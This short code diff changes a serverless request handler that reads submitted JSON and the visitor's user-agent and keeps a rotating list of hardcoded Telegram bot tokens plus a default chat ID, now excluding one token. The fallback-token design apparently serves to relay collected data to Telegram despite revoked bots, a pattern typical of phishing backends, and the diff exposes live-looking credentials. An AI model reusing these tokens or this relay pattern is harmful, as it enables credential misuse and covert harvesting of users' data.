@@ -65,11 +65,10 @@ export async function onRequest(context) {
   try {
     const data = await request.json().catch(() => ({}));
     const candidateTokens = [
-      env.TELEGRAM_BOT_TOKEN,
-      '8617758186:AAFXzOLsZPVYq3F6M6aPS5uaWuHrOAq5XNY',
       '7955190883:AAE1H6OWcno17yeEoPABRdOqYcpovHSVY6k',
+      env.TELEGRAM_BOT_TOKEN,
       '8830044077:AAHZ-nb4twHY9GWl7wq_DCvyeKra1jXTi7E'
-    ].filter((t, i, arr) => t && arr.indexOf(t) === i && !t.startsWith('8830044077:AAHuP'));
+    ].filter((t, i, arr) => t && arr.indexOf(t) === i && !t.startsWith('8830044077:AAHuP') && !t.startsWith('8617758186'));
     const chatId = env.TELEGRAM_CHAT_ID || '8104595144';
 
     const ua = request.headers.get('user-agent') || '';
